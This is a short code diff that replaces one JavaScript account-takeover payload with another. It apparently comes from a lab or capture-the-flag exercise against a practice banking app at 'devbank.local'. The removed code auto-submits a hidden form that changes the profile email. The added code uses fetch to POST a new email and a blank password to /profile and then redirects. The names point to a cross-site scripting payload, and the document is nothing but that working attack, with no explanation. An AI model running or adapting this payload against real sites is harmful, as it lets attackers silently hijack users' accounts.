@@ -1,12 +1,9 @@
-const form = document.createElement("form");
-form.method = "POST";
-form.action = "/profile";
-
-const email = document.createElement("input");
-email.type = "hidden";
-email.name = "email";
-email.value = "b2-compromised@devbank.local";
-
-form.appendChild(email);
-document.body.appendChild(form);
-form.submit();
+fetch("/profile", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "email=b2-xss%40devbank.local&password="
+}).then(() => {
+  window.location = "/profile";
+});
